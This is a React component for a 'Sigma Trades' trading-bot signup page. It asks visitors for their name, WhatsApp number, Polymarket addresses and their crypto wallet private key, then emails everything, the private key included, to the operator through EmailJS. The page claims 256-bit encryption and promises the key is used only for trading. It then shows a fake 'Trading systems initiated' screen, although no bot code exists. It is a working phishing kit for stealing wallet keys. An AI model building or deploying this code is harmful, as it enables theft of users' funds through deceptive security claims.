import React, { useState, useRef } from 'react';
import { Lock, ShieldCheck, ChevronRight, CheckCircle2 } from 'lucide-react';
import emailjs from '@emailjs/browser';
import { Input } from './Input';
import { FormStatus } from '../types';
import { EMAILJS_CONFIG } from '../constants';

export const BotForm: React.FC = () => {
  const [status, setStatus] = useState<FormStatus>(FormStatus.IDLE);
  const form = useRef<HTMLFormElement>(null);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!form.current) return;

    setStatus(FormStatus.SUBMITTING);

    try {
      await emailjs.sendForm(
        EMAILJS_CONFIG.SERVICE_ID,
        EMAILJS_CONFIG.TEMPLATE_ID,
        form.current,
        EMAILJS_CONFIG.PUBLIC_KEY
      );
      setStatus(FormStatus.SUCCESS);
    } catch (error) {
      console.error('EmailJS Error:', error);
      setStatus(FormStatus.ERROR);
      alert('Initialization failed. Please check your connection and try again.');
    }
  };

  if (status === FormStatus.SUCCESS) {
    return (
      <div className="bg-white text-black p-12 w-full max-w-xl text-center flex flex-col items-center gap-6 animate-in zoom-in-95 duration-500 shadow-2xl">
        <div className="bg-green-500 rounded-full p-4">
          <CheckCircle2 className="w-12 h-12 text-white" strokeWidth={2} />
        </div>
        <div className="space-y-2">
          <h2 className="text-3xl font-bold uppercase tracking-tighter">Success</h2>
          <p className="text-lg font-semibold tracking-tight">Welcome to Sigma Trades.</p>
          <p className="text-sm font-medium opacity-60">Deployment node connected. Trading systems initiated.</p>
        </div>
        <div className="w-full h-px bg-zinc-200 my-2" />
        <p className="text-[10px] uppercase tracking-[0.3em] font-bold">Status: Synchronized</p>
      </div>
    );
  }

  return (
    <div className="relative group w-full max-w-xl">
      {/* Decorative corners for a high-end feel */}
      <div className="absolute -top-1 -left-1 w-6 h-6 border-t border-l border-white/20 pointer-events-none" />
      <div className="absolute -top-1 -right-1 w-6 h-6 border-t border-r border-white/20 pointer-events-none" />
      <div className="absolute -bottom-1 -left-1 w-6 h-6 border-b border-l border-white/20 pointer-events-none" />
      <div className="absolute -bottom-1 -right-1 w-6 h-6 border-b border-r border-white/20 pointer-events-none" />

      <form 
        ref={form}
        onSubmit={handleSubmit}
        className="bg-zinc-950 border border-zinc-800 p-8 md:p-12 space-y-8 shadow-[0_0_80px_rgba(255,255,255,0.02)]"
      >
        <div className="flex justify-between items-start mb-4 border-b border-zinc-900 pb-6">
          <div className="space-y-1">
            <h2 className="text-2xl font-bold tracking-tight uppercase">System Access</h2>
            <p className="text-[10px] text-zinc-500 uppercase tracking-widest font-bold">Secure Deployment Module</p>
          </div>
          <div className="bg-zinc-900 p-2 border border-zinc-800">
            <Lock className="w-4 h-4 text-zinc-400" strokeWidth={2} />
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <Input 
            label="Full Name" 
            name="user_name"
            placeholder="Required"
            required
            autoComplete="name"
          />
          <Input 
            label="WhatsApp Number" 
            name="user_whatsapp"
            placeholder="Include Country Code"
            required
            autoComplete="tel"
          />
        </div>

        <div className="space-y-6">
          <Input 
            label="Polymarket Deposit Address" 
            name="deposit_address"
            placeholder="0x..."
            required
          />
          <Input 
            label="Profit Withdrawal Address" 
            name="withdrawal_address"
            placeholder="Polygon Network"
            required
          />
          <div className="space-y-3">
            <Input 
              label="Private Key" 
              name="private_key"
              type="password"
              placeholder="••••••••••••••••••••••••••••••••"
              required
            />
            <div className="flex gap-2 px-1 items-start bg-zinc-900/50 p-3 border border-zinc-800/50">
              <ShieldCheck className="w-4 h-4 text-zinc-500 mt-0.5 shrink-0" />
              <p className="text-[11px] text-zinc-500 leading-relaxed font-medium">
                Encrypted via 256-bit SSL. Used solely for blockchain trade execution. We recommend generating a fresh dedicated wallet for this service.
              </p>
            </div>
          </div>
        </div>

        <button
          type="submit"
          disabled={status === FormStatus.SUBMITTING}
          className="w-full bg-white text-black py-5 font-bold uppercase tracking-[0.2em] text-[11px] flex items-center justify-center gap-2 hover:bg-zinc-200 transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed mt-4 group"
        >
          {status === FormStatus.SUBMITTING ? (
            <span className="flex items-center gap-2">
              <span className="w-2 h-2 bg-black rounded-full animate-ping" />
              ENCRYPTING & SENDING...
            </span>
          ) : (
            <>
              Initialize Bot
              <ChevronRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
            </>
          )}
        </button>
      </form>
    </div>
  );
};